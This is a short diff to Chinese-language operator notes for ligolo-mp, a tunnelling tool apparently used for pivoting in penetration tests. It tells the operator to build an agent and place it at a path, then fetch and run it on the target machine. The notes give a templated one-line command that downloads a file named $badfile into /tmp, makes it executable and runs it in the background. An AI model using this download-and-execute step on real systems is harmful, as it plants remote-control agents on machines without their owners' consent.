@@ -1,3 +1,5 @@
 官方地址：https://github.com/ttpreport/ligolo-mp
-#cd /tmp && wget $downloadurl && chmod +x agnet && ./agent &
+>需要生成agent后覆盖到下面的路径
+$toolfile
+>然后再目标机器下载并执行
 cd /tmp && wget $downloadurl && chmod +x $badfile && ./$badfile &
